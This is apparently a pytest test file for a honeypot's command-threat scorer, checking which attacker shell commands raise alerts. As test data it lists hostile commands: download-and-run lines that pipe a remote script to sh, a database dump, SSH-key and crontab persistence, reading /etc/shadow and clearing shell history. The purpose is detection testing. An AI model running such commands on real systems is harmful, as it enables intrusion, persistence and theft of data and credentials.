"""Scores rank what an attacker did, so an alert marks something worth reading.

Every command used to score 100, so every command raised an alert. On real
traffic that buries a session's download-and-run under its `uname -a`.
"""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

from enrichment.scorer import ALERT_THRESHOLD, classify_command
from hubfakes import DROP, event_body, signed, stores  # noqa: F401  (stores is a fixture)


@pytest.mark.parametrize("command", [
    "uname -a",
    "cat /proc/cpuinfo | grep name | wc -l",
    "ls -la /tmp",
    "cat /etc/passwd",
    "crontab -l",
    "cat ~/.ssh/known_hosts",
    "echo hello | sha256sum",
    "cd ./logs",
    "mysql --version",
])
def test_ordinary_shell_use_never_alerts(command):
    category, score = classify_command(command)
    assert score < ALERT_THRESHOLD, category


@pytest.mark.parametrize("command, category", [
    ("cd /tmp; wget http://198.51.100.1/x; chmod +x x; ./x", "payload_execution"),
    ("curl -s http://198.51.100.1/i.sh | sh", "payload_execution"),
    ("echo ZWNobyBoaQ== | base64 -d | bash", "payload_execution"),
    ('mysql -h db-01 -u erp_admin -pX -e "select count(*) from erp.students;"', "data_exfiltration"),
    ("mysqldump -u root -p erp > /tmp/erp.sql", "data_exfiltration"),
    ('psql -h db-01 -U app -c "select * from users"', "data_exfiltration"),
    ('echo "ssh-ed25519 AAAA" >> ~/.ssh/authorized_keys', "persistence"),
    ('(crontab -l; echo "* * * * * /tmp/x") | crontab -', "persistence"),
    ("echo root:pw | chpasswd", "persistence"),
    ("ssh deploy@10.20.0.6", "lateral_movement"),
    ("wget http://198.51.100.1/x", "tool_download"),
    ("scp -t /tmp/x", "tool_download"),
    ("cat /etc/shadow", "credential_access"),
    ("history -c", "defense_evasion"),
])
def test_what_a_command_does_decides_its_score(command, category):
    found, score = classify_command(command)
    assert found == category
    assert score >= ALERT_THRESHOLD


def post(stores, **changes) -> None:
    body = event_body(**changes)
    response = TestClient(stores.app).post("/ingest/", content=body, headers=signed(body))
    assert response.status_code == 200, response.text


def command(text: str, **changes) -> dict:
    return {"input": text, "message": f"CMD: {text}", **changes}


def test_ordinary_commands_and_logins_raise_no_alert(stores):
    post(stores, **command("uname -a"))
    post(stores, eventid="cowrie.login.success", input=DROP,
         message="login attempt [root/root] succeeded")
    assert stores.db.alerts == []


def test_one_alert_per_session_and_kind_of_threat(stores):
    post(stores, **command("wget http://198.51.100.1/a"))
    post(stores, **command("wget http://198.51.100.1/b"))
    post(stores, **command("cd /tmp; ./b"))
    post(stores, **command("cd /tmp; ./b &"))
    found = sorted((a.alert_type, a.threat_score) for a in stores.db.alerts)
    assert found == [("payload_execution", 95), ("tool_download", 80)]


def test_a_worse_event_of_the_same_kind_raises_the_open_alert(stores):
    post(stores, **command("wget http://198.51.100.1/a"))  # 10:00 UTC
    post(stores, **command("wget http://198.51.100.1/b",
                           timestamp="2026-11-01T03:00:00.000000Z"))  # off-hours, +5
    (alert,) = stores.db.alerts
    assert alert.threat_score == 85
    assert alert.description == "CMD: wget http://198.51.100.1/b"


def test_each_session_gets_its_own_alert(stores):
    post(stores, **command("history -c"))
    post(stores, session="bbbbbbbbbbbb", **command("history -c"))
    assert sorted(a.session_id for a in stores.db.alerts) == ["a1b2c3d4e5f6", "bbbbbbbbbbbb"]
